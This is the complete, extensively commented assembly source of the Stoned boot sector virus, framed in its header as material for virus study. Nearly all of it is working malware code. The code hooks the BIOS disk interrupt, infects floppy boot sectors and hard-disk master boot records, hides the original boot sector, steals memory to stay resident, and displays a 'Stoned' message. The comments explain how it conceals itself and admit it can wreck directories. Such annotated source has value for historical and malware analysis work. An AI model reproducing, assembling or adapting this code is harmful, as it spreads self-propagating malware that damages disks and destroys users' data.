TITLE   STONBOOT        1-4-80  [5-12-90]

PAGE 27,132

;*****************************************************************************
;
;         *** NOT FOR GENERAL DISTRIBUTION ***     The Stoned Virus
;
; This file is for the purpose of virus study only! It should not be passed
;  around among the general public. It will be very useful for learning
;  how viruses work and propagate. But anybody with access to an assembler
;  can turn it into a working virus and anybody with a bit of assembly coding
;  experience can turn it into a far more malevolent program than it already
;  is. Keep this code in reasonable hands!
;
; This is a boot sector virus, and an extremely tiny one. It occupies only a
;  single sector. On a diskette, it resides in the boot sector, and on a hard
;  disk resides in the mastor boot record. It can be installed on a 5 1/4 inch
;  diskette by copying the real boot sector to side 1, track 0, sector 3. This
;  is the last sector used by the directory, and is usually not used. If the
;  directory ever does expand into this area, then the real boot sector will be
;  trashed, and the diskette will no longer be bootable. Once the boot sector
;  is copied to the directory area, this code goes into the boot sector space
;  at side 0, track 0, sector 1. The system is then transferred to the diskette
;  and the diskette contains an activated virus. Once this diskette is used to
;  boot up a system, it will become resident and infect other diskettes it
;  sees. If the system contains a hard drive, it too will become infected.
;
; This virus does not contain any time bomb, but it can cause loss of data by
;  wrecking a directory here or there.
;*****************************************************************************


LF      EQU     0AH
CR      EQU     0DH

XSEG    SEGMENT AT      07C0h
        ORG     5
NEWSEG  LABEL   FAR
XSEG    ENDS

CODE    SEGMENT
        ASSUME DS:CODE, SS:CODE, CS:CODE, ES:CODE
        ORG     0


;*****************************************************************************
; Execution begins here as a boot record. This means that its location and
;  CS:IP will be 0000:7C00. The following two JMP instructions accomplish only
;  a change in CS:IP so that CS is 07C0. The following two JMPs, and the
;  segment definition of XSEG above are best not tampered with.
;*****************************************************************************


        JMP  FAR PTR NEWSEG     ;This is exactly 5 bytes long. Don't change it

;The above line will jump to here, with a CS of 07C0 and an IP of 5

        JMP     JPBOOT                  ;Jump here at boot up time


;*****************************************************************************
; The following offsets:
;    D_TYPE
;    O_13_O
;    O_13_S
;    J_AD_O
;    J_AD_S
;    BT_ADD
;  will be used to access their corresponding variables throughout the code.
;  They will vary in different parts of the code, since the code relocates
;  itself and the values in the segment registers will change. The actual
;  variables are defined with a leading underscore, and should not be used. As
;  the segment registers, and the offsets used to access them, change in the
;  code, the offsets will be redefined with "=" operators. At each point, the
;  particular segment register override needed to access the variables will be
;  given.
;
; In this area, the variables should be accessed with the CS: segment override.
;******************************************************************************

D_TYPE  =       $               ;The type of disk we are booting from
_D_TYPE DB      0

OLD_13  EQU     $
O_13_O  =       $               ;Old INT 13 vector offset
_O_13_O DW      ?

O_13_S  =       $               ;Old INT 13 vector segment
_O_13_S DW      ?

JMP_ADR EQU     $
J_AD_O  =       $               ;Offset of the jump to relocated code
_J_AD_O DW      OFFSET HI_JMP

J_AD_S  =       $               ;Segment of the jump to the relocated code
_J_AD_S DW      ?


BT_ADD  =       $               ;Fixed address 0:7C00. Jump addr to boot sector
_BT_ADD DW      7C00h           ;Boot address segment
        DW      0000h           ;Boot address offset



;**********************************************************
;       The INT 13H vector gets hooked to here
;**********************************************************

NEW_13: PUSH    DS
        PUSH    AX
        CMP     AH,2
        JB      REAL13                  ;Restore regs & do real INT 13H

        CMP     AH,4
        JNB     REAL13                  ;Restore regs & do real INT 13H

;*****************************************************************
;    We only get here for service 2 or 3 - Disk read or write
;*****************************************************************

        OR      DL,DL
        JNZ     REAL13                  ;Restore regs & do real INT 13H

;*****************************************************************
;     And we only get here if it's happening to drive A:
;*****************************************************************

        XOR     AX,AX
        MOV     DS,AX
        MOV     AL,DS:43FH
        TEST    AL,1                    ;Check to see if drive motor is on
        JNZ     REAL13                  ;Restore regs & do real INT 13H

;******************************************************************
;           We only get here if the drive motor is on.
;******************************************************************

        CALL    INFECT                  ;Try to infect the disk

;******************************************************************
;                Restore regs & do real INT 13H
;******************************************************************

REAL13: POP     AX
        POP     DS
        JMP     DWORD PTR       CS:OLD_13



;**************************************************************
;***          See if we can infect the disk                 ***
;**************************************************************

INFECT  PROC    NEAR

        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    ES
        PUSH    SI
        PUSH    DI
        MOV     SI,4            ;We'll try up to 4 times to read it

;***************************************************************
;            Loop to try reading disk sector
;***************************************************************

RDLOOP: MOV     AX,201H         ;Read one sector...
        PUSH    CS
        POP     ES
        MOV     BX,200H         ;...into a space at the end of the code
        XOR     CX,CX
        MOV     DX,CX           ;Side 0, drive A
        INC     CX              ;Track 0, sector 1
        PUSHF
        CALL    DWORD PTR CS:OLD_13     ;Do the old INT 13

        JNB     RD_OK           ;Disk read was OK

        XOR     AX,AX
        PUSHF
        CALL    DWORD PTR CS:OLD_13     ;Reset disk

        DEC     SI              ;Bump the counter
        JNZ     RDLOOP          ;Loop to try reading disk sector
        JMP     SHORT   QUIT    ;Close up and return if all 4 tries failed

        NOP

;******************************************************************************
; Here if disk read was OK. We got the boot sector. But is it already infected?
;  Find out by comparing the first 4 bytes of the boot sector to the first 4
;  bytes of this code. If they don't match exactly, infect the diskette.
;******************************************************************************

RD_OK:  XOR     SI,SI
        MOV     DI,200H
        CLD
        PUSH    CS
        POP     DS
        LODSW
        CMP     AX,[DI]
        JNZ     HIDEIT                  ;Hide floppy boot sector in directory

        LODSW
        CMP     AX,[DI+2]
        JZ      QUIT                    ;Close up and return

;************************************************************
;       Infect - Hide floppy boot sector in directory
;************************************************************

HIDEIT: MOV     AX,301H         ;Write 1 sector
        MOV     BX,200H         ;From the space at the end of this code
        MOV     CL,3            ;To sector 3
        MOV     DH,1            ;Side 1
        PUSHF
        CALL    DWORD PTR CS:OLD_13     ;Do the old INT 14
        JB      QUIT            ;Close up and return if failed

;******************************************************************
; If write was sucessful, write this code to the boot sector area
;******************************************************************

        MOV     AX,301H         ;Write 1 sector ...
        XOR     BX,BX           ;...of this very code...
        MOV     CL,1            ;...to sector 1...
        XOR     DX,DX           ;...of Side 0, drive A
        PUSHF
        CALL    DWORD PTR CS:OLD_13     ;Do an old INT 13

;  ***NOTE*** no test has been done for a sucessful write.

;***************************************************************
;                    Close up and return
;***************************************************************

QUIT:   POP     DI
        POP     SI
        POP     ES
        POP     DX
        POP     CX
        POP     BX
        RET

INFECT  ENDP





;****************************************************************
;***             Jump here at boot up time
;****************************************************************




;*****************************************************************************
; Redefine the variable offsets. The code here executes in the memory area
;  used by the normal boot sector. The variable offsets have an assembled
;  value of the order 7Cxx. Access them here through the DS: segment override
;*****************************************************************************


D_TYPE  =       07C00h + OFFSET _D_TYPE
O_13_O  =       07C00h + OFFSET _O_13_O
O_13_S  =       07C00h + OFFSET _O_13_S
J_AD_O  =       07C00h + OFFSET _J_AD_O
J_AD_S  =       07C00h + OFFSET _J_AD_S
BT_ADD  =       07C00h + OFFSET _BT_ADD



JPBOOT: XOR     AX,AX
        MOV     DS,AX           ;DS = 0

;*********************************************************
;                Set up a usable stack
;*********************************************************

        CLI
        MOV     SS,AX           ;SS = 0
        MOV     SP,OFFSET 7C00H ;Position stack at 0000:7C00
        STI

;*********************************************************
;        Capture the INT 13 vector (BIOS disk I/O)
;*********************************************************

        MOV     AX,DS:4CH       ;Offset for old INT 13 vector
        MOV     DS:O_13_O,AX    ;Save the offset
        MOV     AX,DS:4EH       ;Segment for old INT 13 vector
        MOV     DS:O_13_S,AX    ;Save the segment

;*****************************************************************************
; Decrease the memory available to DOS by 2K. Only 1K really seems needed, but
;  stealing an odd number of K would result in an odd number shown available
;  when a CHKDSK is run. This might be too obvious. Or the programmer may have
;  had other plans for the memory.
;*****************************************************************************

        MOV     AX,DS:413H      ;BIOS' internal count of available memory
        DEC     AX
        DEC     AX              ;Drop it by 2K ...
        MOV     DS:413H,AX      ;...and store it (steal it!!)

;*********************************************************
;        Find the segment of the stolen memory
;*********************************************************

        MOV     CL,6
        SHL     AX,CL
        MOV     ES,AX

;*********************************************************
;        Use the segment of the stolen memory area
;*********************************************************

        MOV     DS:J_AD_S,AX    ;Becomes part of a JMP address
        MOV     AX,OFFSET NEW_13
        MOV     DS:4CH,AX       ;Offset for new INT 13
        MOV     DS:4EH,ES       ;Segment for new INT 13

;****************************************************************
;Copy the code from 07C0:0000 to ES:0000 (the stolen memory area)
;****************************************************************

        MOV     CX,OFFSET END_BYT ;The size of the code (# of bytes to move)
        PUSH    CS
        POP     DS              ;DS = CS
        XOR     SI,SI
        MOV     DI,SI           ;All offsets of block move areas are 0
        CLD
        REPZ    MOVSB           ;Copy each byte of code to the top of memory
        JMP     DWORD PTR       CS:JMP_ADR ;JMP to the transferred code...



;**************************************************************
;    ...and we'll jump right here, to the transferred code
;**************************************************************



;****************************************************************************
; Redefine variable offsets again. This code executes at the top of memory,
;  and so the exact value of the segment registers depends on how much memory
;  is installed. The variable offsets have an assembled value of the order of
;  00xx. They are accessed using the CS: segment override
;****************************************************************************

D_TYPE  =       OFFSET _D_TYPE
O_13_O  =       OFFSET _O_13_O
O_13_S  =       OFFSET _O_13_S
J_AD_O  =       OFFSET _J_AD_O
J_AD_S  =       OFFSET _J_AD_S
BT_ADD  =       OFFSET _BT_ADD


HI_JMP: MOV     AX,0
        INT     13H             ;Reset disk system

;**********************************************************************
;  This will read one sector into 0000:7C00 (the boot sector address)
;**********************************************************************

        XOR     AX,AX
        MOV     ES,AX
        MOV     AX,201H                 ;Read one sector
        MOV     BX,OFFSET 7C00H         ;To boot sector area: 0000:7C00
        CMP     BYTE PTR CS:D_TYPE,0    ;Booting from diskette or hard drive?

        JZ      DISKET                  ;If booting from a diskette

;******************************************************
;            Booting from a hard drive
;******************************************************

        MOV     CX,7            ;Track 0, sector 7
        MOV     DX,80H          ;Hard drive, side 0
        INT     13H             ;Go get it

;  ***NOTE** There was no check as to wether or not the read was sucessful

        JMP     SHORT   BOOTUP  ;Go run the real boot sector we've installed

        NOP

;******************************************************
;            Booting from a diskette
;******************************************************

DISKET: MOV     CX,3            ;Track 0, sector 3
        MOV     DX,100H         ;A drive, side 1 (last sector of the directory)
        INT     13H             ;Go get it
        JB      BOOTUP          ;If read error, run it anyway.(???) (A prank?)

;****************************************************************
;Wether or not we print the "Stoned" message depends on the value
; of a byte in the internal clock time -- a fairly random event.
;****************************************************************

        TEST    BYTE PTR ES:46CH,7      ;Test a bit in the clock time
        JNZ     GETHDB                  ;Get Hard drive boot sector

;**************************************************************
;                      Print the message
;**************************************************************

        MOV     SI,OFFSET S_MSG ;Address of the "stoned message"
        PUSH    CS
        POP     DS

;**************************************************************
;               Loop to print individual characters
;**************************************************************

PRINT1: LODSB
        OR      AL,AL           ;A 00 byte means quit the loop
        JZ      GETHDB          ;Get Hard drive boot sector, then

;**************************************************************
;         Not done looping. Print another character
;**************************************************************

        MOV     AH,0EH
        MOV     BH,0
        INT     10H
        JMP     SHORT   PRINT1  ;Print a character on screen


;**************************************************************
;               Get Hard drive boot sector
;**************************************************************

GETHDB: PUSH    CS
        POP     ES
        MOV     AX,201H         ;Read one sector...
        MOV     BX,200H         ;...to the buffer following this code...
        MOV     CL,1            ;...from sector 1...
        MOV     DX,80H          ;...side 0, of the hard drive
        INT     13H
        JB      BOOTUP          ;If error, assume no hard drive
                                ; So go run the floppy boot sector

;***************************************************************************
; If no read error, then there really must be a hard drive. Infect it. The
;  following code uses the same trick above where the first 4 bytes of the
;  boot sector are compared to the first 4 bytes of this code. If they don't
;  match exactly, then this hard drive isn't infected.
;***************************************************************************

        PUSH    CS
        POP     DS
        MOV     SI,200H
        MOV     DI,0
        LODSW
        CMP     AX,[DI]
        JNZ     HIDEHD                  ;Hide real boot sector in hard drive

        LODSW
        CMP     AX,[DI+2]
        JNZ     HIDEHD                  ;Hide real boot sector in hard drive

;**************************************************************
;                Go run the real boot sector
;**************************************************************

BOOTUP: MOV     BYTE PTR CS:D_TYPE,0
        JMP     DWORD PTR       CS:BT_ADD

;**************************************************************
;         Infect - Hide real boot sector in hard drive
;**************************************************************

HIDEHD: MOV     BYTE PTR CS:D_TYPE,2    ;Mark this as a hard drive infection
        MOV     AX,301H                 ;Write i sector...
        MOV     BX,200H         ;...from the buffer following this code...
        MOV     CX,7            ;...to track 0, sector 7...
        MOV     DX,80H          ;...side 0, of the hard drive...
        INT     13H             ;Do it
        JB      BOOTUP          ;Go run the real boot sector if failed

;**************************************************
; Here if the boot sector got written successfully
;***************************************************

        PUSH    CS
        POP     DS
        PUSH    CS
        POP     ES
        MOV     SI,3BEH         ;Offset of disk partition table in the buffer
        MOV     DI,1BEH         ;Copy it to the same offset in this code
        MOV     CX,242H         ;Strange. Only need to move 42H bytes. This
                                ; won't hurt, and will overwrite the copy of
                                ; the boot sector, maybe giving a bit more
                                ; concealment.
        REPZ    MOVSB           ;Move them
        MOV     AX,301H         ;Write 1 sector...
        XOR     BX,BX           ;...of this code...
        INC     CL              ;...into sector 1
        INT     13H

; ***NOTE*** no check for a sucessful write

        JMP     BOOTUP          ;Now run the real boot sector

S_MSG   DB      7,'Your PC is now Stoned!',7,CR,LF
        DB      LF

;*************************************************************************
; Just garbage. In one version, this contained an extension of the above
;  string, saying "LEGALIZE MARIJUANA". Some portions of this text remain
;*************************************************************************

        DB      0,4CH,45H,47H,41H
        DB      4CH,49H,53H,45H,67H
        DB      2,4,68H,2,68H
        DB      2,0BH,5,67H,2

END_BYT EQU     $               ;Used to determine the size of the code. It
                                ; must be less than 1BE, or this code is too
                                ; large to be used to infect hard disks. From
                                ; offset 1BE and above, the hard disk partition
                                ; table will be copied, and anything placed
                                ; there will get clobbered.

        CODE    ENDS

END
